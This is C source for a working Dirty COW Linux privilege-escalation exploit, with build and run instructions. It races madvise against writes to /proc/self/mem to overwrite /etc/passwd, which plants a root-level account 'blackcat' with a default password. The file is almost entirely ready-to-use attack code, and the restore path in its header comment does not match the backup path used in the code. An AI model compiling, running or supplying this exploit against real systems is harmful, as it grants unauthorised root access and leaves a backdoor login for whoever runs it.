/* 
This exploit uses the dirtycow vulnerability
The default user:password is blackcat:1234

Compile With:
  gcc exploit_proc.c -o exploit_proc -lpthread -lcrypt

Then run newly create binary by "./exploit_proc"
Afterwards, you can either "su blackcat" or "ssh blackcat@..."

if you restore /etc/passwd then use this "mv /etc/passwd.bak /etc/passwd"
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <crypt.h>

const char *passwdFile = "/etc/passwd";
const char *backupPasswd = "/tmp/passwd.bak";

void *map;

struct Userinfo {
	char *username;
	char *hash;
	int userID;
	int groupID;
	char *info;
	char *homeDir;
	char *shell;
};

int copy_file(const char*from, const char *to);
char *gen_passwd_line(struct Userinfo user);
void *madviseThread(void* arg);
void *processSelfMem(void *arg);
char *gen_password_hash(char *password);

int copy_file(const char *from, const char *to){

	if(access(to, F_OK) != -1){
		printf("File %s exists! Please delete it and run again!\n", to);
		return -1;
	}	

	char ch;
	FILE *source, *target;
	
	if((source = fopen(from, "r")) == NULL){
		return -1;
	}

	if((target = fopen(to, "w")) == NULL){
		return -1;
	}

	while((ch = fgetc(source)) != EOF){
		fputc(ch, target);
	}

	printf("[*] %s successfully backed up to %s\n", from, to);
	
	fclose(source);
	fclose(target);
	
	return 0;
}

char *gen_passwd_line(struct Userinfo user){
	const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
	int size = snprintf(NULL, 0, format, user.username,
					 user.hash,
					 user.userID,
					 user.groupID,
					 user.info,
					 user.homeDir,
					 user.shell);
	char *line = malloc(size+1);
	sprintf(line, format, user.username,
			      user.hash,
			      user.userID,
			      user.groupID,
			      user.info,
			      user.homeDir,
			      user.shell);
	return line;
}

void *madviseThread(void *arg){
	int i, count=0;
	for(i=0; i<500000; i++){
		count += madvise(map, 100, MADV_DONTNEED);
	}
	printf("madvise %d\n\n", count);
}

void *processSelfMem(void *arg){
	int f=open("/proc/self/mem", O_RDWR);
	int i, count=0;
	for(i=0; i<500000; i++){
		lseek(f, (uintptr_t)map, SEEK_SET);
		count += write(f, (char*)arg, strlen((char*)arg));
	}
	printf("processSelfMem %d\n\n", count);	
}

char *gen_password_hash(char *password) {
	const char* salt = "blackcat";
 	return crypt(password, salt);
}

int main(int argc, char** argv){
	const char* path = "/proc/sys/vm/dirty_writeback_centisecs";
	
	if(!access(path, F_OK)){
		FILE *fp;
		const char* command = "cat /proc/sys/vm/dirty_writeback_centisecs";
		char value[10];

		memset(value, 0, sizeof(value));
		if((fp = popen(command, "r")) == NULL){
			printf("popen Error");
			return -1;
		}		
		
		size_t byte;
		fread(value, sizeof(char), sizeof(value), fp);
		value[strcspn(value, "\n")] = '\0';		

		if(strcmp(value,"0") != 0){
			printf("[!]vm detect!!!\n");
			printf("[*]please change /proc/sys/vm/dirty_writeback_centisecs to 0\n");
			return -1;
		}
		fclose(fp);
	}
	
	int ret = copy_file(passwdFile, backupPasswd);
	if(ret != 0){
		exit(0);
	}
	
	struct Userinfo user;
	user.username="blackcat";
	if(argc >= 2){
		user.hash=gen_password_hash(argv[1]);
	}
	else{
		user.hash=gen_password_hash("1234");
	}
	user.userID=0;
	user.groupID=0;
	user.info="hacker";
	user.homeDir="/root";
	user.shell="/bin/bash";

	char *passwd_line = gen_passwd_line(user);
	printf("[+] Success Create passwd : %s\n", passwd_line);

	int f;
	struct stat st;
	f = open(passwdFile, O_RDONLY);
	fstat(f, &st);
	map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
	printf("[+] mmap Address: %lx\n", (unsigned long)map);
		
	pthread_t p_madvise, p_selfmem;
	pthread_create(&p_madvise, NULL, madviseThread, NULL);
	pthread_create(&p_selfmem, NULL, processSelfMem, passwd_line);
	pthread_join(p_madvise, NULL);
	pthread_join(p_selfmem, NULL);
	close(f);

	printf("[*] Done! Check %s to see if the new user was created.\n", passwdFile);
	
	if(argc >= 2){
		printf("[+] You Can log-in with username:password -> blackcat:%s\n",argv[1]);
	}
	else{
		printf("[+] You can log-in with username:password -> blackcat:1234\n");
	}
	printf("[+] if you want restore /etc/passwd -> 'mv /etc/passwd.bak /etc/passwd'\n");
	printf("[+] Bye Bye~~\n");
	return 0;
}
